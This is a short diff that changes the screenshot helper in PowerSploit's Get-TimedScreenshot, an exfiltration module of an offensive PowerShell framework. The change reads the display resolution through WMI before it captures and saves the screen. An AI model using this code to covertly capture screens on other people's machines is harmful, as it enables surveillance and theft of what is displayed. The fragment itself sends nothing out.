@@ -52,9 +52,25 @@ https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Timed
     #Define helper function that generates and saves screenshot
     Function Get-Screenshot {
        $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
-       $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
+
+       $VideoController = Get-WmiObject -Query 'SELECT VideoModeDescription FROM Win32_VideoController'
+
+       if ($VideoController.VideoModeDescription -and $VideoController.VideoModeDescription -match '(?<ScreenWidth>^\d+) x (?<ScreenHeight>\d+) x .*$') {
+           $Width = [Int] $Matches['ScreenWidth']
+           $Height = [Int] $Matches['ScreenHeight']
+       } else {
+           $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
+
+           $Width = $ScreenBounds.Width
+           $Height = $ScreenBounds.Height
+       }
+
+       $Size = New-Object System.Drawing.Size($Width, $Height)
+       $Point = New-Object System.Drawing.Point(0, 0)
+
+       $ScreenshotObject = New-Object Drawing.Bitmap $Width, $Height
        $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
-       $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
+       $DrawingGraphics.CopyFromScreen($Point, [Drawing.Point]::Empty, $Size)
        $DrawingGraphics.Dispose()
        $ScreenshotObject.Save($FilePath)
        $ScreenshotObject.Dispose()
